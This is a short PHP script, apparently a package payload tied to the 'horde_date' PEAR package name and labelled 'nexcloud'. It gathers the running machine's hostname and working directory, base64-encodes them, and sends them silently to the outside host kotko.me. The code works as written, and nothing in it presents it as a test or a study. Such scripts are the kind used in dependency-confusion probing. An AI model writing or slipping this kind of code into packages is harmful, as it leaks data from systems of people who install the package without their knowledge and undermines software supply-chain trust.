<?php
$name = "nexcloud:";
$package = "pear-pear.horde.org/horde_date";

$arr = [];
$arr[0] = gethostname();
$arr[1] = getcwd();
$arr = implode(",",$arr);

file_get_contents("https://kotko.me?".$name.$package."=".base64_encode($arr));
